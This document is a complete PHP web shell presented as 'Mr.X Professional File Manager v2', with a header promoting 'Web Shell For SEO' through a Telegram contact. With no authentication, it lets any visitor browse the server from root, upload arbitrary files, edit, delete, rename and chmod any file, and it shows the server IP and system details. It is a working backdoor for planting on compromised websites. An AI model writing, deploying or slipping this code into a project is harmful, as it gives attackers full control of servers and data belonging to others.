<?php
error_reporting(0);

$root = getcwd();
$path = isset($_GET['path']) ? $_GET['path'] : $root;
$path = realpath($path);
if(!$path) $path = $root;

/* ================= HELPERS ================= */

function perms($f){
    return substr(sprintf('%o', fileperms($f)), -4);
}

function size($s){
    if($s>=1073741824)return round($s/1073741824,2)." GB";
    if($s>=1048576)return round($s/1048576,2)." MB";
    if($s>=1024)return round($s/1024,2)." KB";
    return $s." B";
}

/* ================= BREADCRUMB ================= */

function breadcrumb($path){
    $path=str_replace('\\','/',$path);
    $parts=explode('/',$path);

    $build="";
    echo "<div class='path'>";
    echo "<a href='?path=/'>ROOT</a> / ";

    foreach($parts as $p){
        if($p=="") continue;
        $build.="/".$p;
        echo "<a href='?path=$build'>$p</a> / ";
    }
    echo "</div>";
}

/* ================= SERVER ================= */

$ip = $_SERVER['SERVER_ADDR'] ?? $_SERVER['REMOTE_ADDR'];

/* ================= UPLOAD ================= */

if(isset($_POST['upload'])){
    if(isset($_FILES['file']) && $_FILES['file']['error']==0){
        move_uploaded_file($_FILES['file']['tmp_name'],$path.'/'.basename($_FILES['file']['name']));
    }
}

/* ================= DELETE ================= */

if(isset($_GET['delete'])){
    $d=$_GET['delete'];
    if(is_file($d)) unlink($d);
    header("Location:?path=".$path);
    exit;
}

/* ================= RENAME ================= */

if(isset($_POST['rename'])){
    if(!empty($_POST['old']) && !empty($_POST['new'])){
        rename($_POST['old'],dirname($_POST['old']).'/'.basename($_POST['new']));
    }
    header("Location:?path=".$path);
    exit;
}

/* ================= CHMOD ================= */

if(isset($_POST['chmod'])){
    if(!empty($_POST['file']) && !empty($_POST['perm'])){
        @chmod($_POST['file'],octdec($_POST['perm']));
    }
    header("Location:?path=".$path);
    exit;
}

/* ================= EDIT SAVE ================= */

if(isset($_POST['save'])){
    if(isset($_POST['file'])){
        file_put_contents($_POST['file'],$_POST['content']);
    }
    header("Location:?path=".$path);
    exit;
}

/* ================= 🔥 FIXED CREATE SYSTEM ================= */

/* CREATE FOLDER (FIXED) */
if(isset($_POST['mkdir'])){
    if(!empty($_POST['folder'])){
        $newFolder = $path.'/'.basename($_POST['folder']);
        if(!file_exists($newFolder)){
            mkdir($newFolder,0755,true);
        }
    }
    header("Location:?path=".$path);
    exit;
}

/* CREATE FILE (FIXED) */
if(isset($_POST['mkfile'])){
    if(!empty($_POST['file'])){
        $newFile = $path.'/'.basename($_POST['file']);
        if(!file_exists($newFile)){
            file_put_contents($newFile,"");
        }
    }
    header("Location:?path=".$path);
    exit;
}

/* ================= LIST ================= */

$scan=scandir($path);
$dirs=[];$files=[];

foreach($scan as $f){
    if($f=="."||$f=="..") continue;
    if(is_dir("$path/$f")) $dirs[]=$f;
    else $files[]=$f;
}

/* ================= EDIT ================= */

$edit=$_GET['edit']??null;
$content=$edit&&is_file($edit)?file_get_contents($edit):"";
?>

<!DOCTYPE html>
<html>
<head>
<title>Mr.X File Manager</title>

<style>
body{margin:0;background:#0f172a;color:#fff;font-family:Arial}

.header{
text-align:center;
padding:20px;
background:linear-gradient(90deg,#0ea5e9,#2563eb,#7c3aed);
font-weight:bold;
}

.serverinfo{font-size:12px;margin-top:5px;color:#e2e8f0}

.path{background:#020617;padding:10px;margin-bottom:10px}
.path a{color:#22c55e;text-decoration:none;font-weight:bold}

table{width:100%;border-collapse:collapse;background:#020617}
th{background:#1e293b;padding:10px}
td{padding:8px;border-bottom:1px solid #1e293b}

.folder a{color:#facc15;font-weight:bold;text-decoration:none}
.file{color:#fff}

.btn{background:#2563eb;color:#fff;padding:5px 8px;border-radius:4px;text-decoration:none;font-size:12px}
.small{width:90px;padding:3px;font-size:12px;background:#0f172a;color:#fff;border:1px solid #1e293b}
.smallbtn{padding:3px 6px;font-size:12px;background:#2563eb;color:#fff;border:none;border-radius:3px}
textarea{width:100%;height:280px;background:#0f172a;color:#fff}
</style>
</head>

<body>

<div class="header">
<div style="font-size:22px;">Mr.X Professional File Manager v2</div>

<div style="margin-top:5px;font-size:13px;">
More tools and Web Shell For SEO contact: <a href="https://t.me/jackleet" style="color:#22c55e">@jackleet</a>
</div>

<div class="serverinfo">
🌐 Server IP: <?php echo $ip; ?> <br>
<?php echo php_uname(); ?>
</div>
</div>

<div style="padding:15px;">

<a class="btn" href="?path=<?php echo dirname($path);?>">⬆ Up</a>
<a class="btn" href="?path=<?php echo $root;?>">🏠 Home</a>

<br><br>

<?php breadcrumb($path); ?>

<!-- UPLOAD -->
<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<button class="smallbtn" name="upload">Upload</button>
</form>

<br>

<!-- CREATE (FIXED WORKING) -->
<form method="post">
<input class="small" name="folder" placeholder="Folder">
<button class="smallbtn" name="mkdir">+</button>

<input class="small" name="file" placeholder="File">
<button class="smallbtn" name="mkfile">+</button>
</form>

<br>

<!-- EDIT -->
<?php if($edit): ?>
<h3>Editing: <?php echo basename($edit); ?></h3>
<form method="post">
<input type="hidden" name="file" value="<?php echo $edit; ?>">
<textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
<br>
<button class="smallbtn" name="save">Save</button>
</form>
<?php endif; ?>

<!-- FILE LIST -->
<table>
<tr>
<th>Name</th>
<th>Size</th>
<th>Perm</th>
<th>Action</th>
</tr>

<?php foreach($dirs as $d): $p="$path/$d"; ?>
<tr>
<td class="folder">📁 <a href="?path=<?php echo $p;?>"><?php echo $d;?></a></td>
<td>--</td>
<td><?php echo perms($p);?></td>
<td>
<a class="btn" href="?delete=<?php echo $p;?>">Del</a>
</td>
</tr>
<?php endforeach; ?>

<?php foreach($files as $f): $p="$path/$f"; ?>
<tr>
<td class="file">📄 <?php echo $f;?></td>
<td><?php echo size(filesize($p));?></td>
<td><?php echo perms($p);?></td>
<td>

<a class="btn" href="?edit=<?php echo $p;?>">Edit</a>
<a class="btn" href="?delete=<?php echo $p;?>">Del</a>

<form method="post" style="display:inline">
<input type="hidden" name="old" value="<?php echo $p;?>">
<input class="small" name="new" placeholder="rename">
<button class="smallbtn" name="rename">R</button>
</form>

<form method="post" style="display:inline">
<input type="hidden" name="file" value="<?php echo $p;?>">
<input class="small" name="perm" placeholder="0777">
<button class="smallbtn" name="chmod">C</button>
</form>

</td>
</tr>
<?php endforeach; ?>

</table>

</div>

</body>
</html>